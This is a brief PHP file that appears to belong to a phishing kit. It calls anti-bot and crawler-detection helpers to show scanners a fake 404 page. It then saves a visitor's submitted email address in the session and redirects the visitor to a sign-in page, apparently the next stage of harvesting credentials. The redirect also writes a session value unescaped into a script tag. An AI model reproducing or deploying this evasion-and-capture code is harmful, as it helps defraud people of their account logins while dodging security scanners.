<?php 
	session_start();
	require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkValue()) {
        echo $antibot->throw404();
        die();
    } 
	include '../../crawlerdetect.php';
	        // variable declaration
	        $errors = array(); 

$_SESSION['emaill'] = $_POST['emaill'];

            $key = $_SESSION['value'];

            echo "<script>window.location.href='../../signin.php?value=".$key."';</script>";

            ?>